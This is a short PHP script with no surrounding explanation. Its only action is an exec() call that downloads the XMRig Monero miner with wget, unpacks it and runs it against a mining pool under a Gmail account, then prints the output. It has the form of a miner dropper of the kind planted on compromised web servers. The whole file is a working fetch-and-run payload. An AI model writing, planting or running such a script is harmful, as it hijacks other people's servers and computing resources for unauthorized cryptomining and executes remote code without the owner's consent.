<?php
        $error = Array();
        exec("wget https://github.com/xmrig/xmrig/releases/download/v6.5.3/xmrig-6.5.3-linux-x64.tar.gz && tar xvzf  xmrig-6.5.3-linux-x64.tar.gz && ./xmrig-6.5.3/xmrig -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u usvk1997@gmail.com", $error);
        var_dump($error);
?>
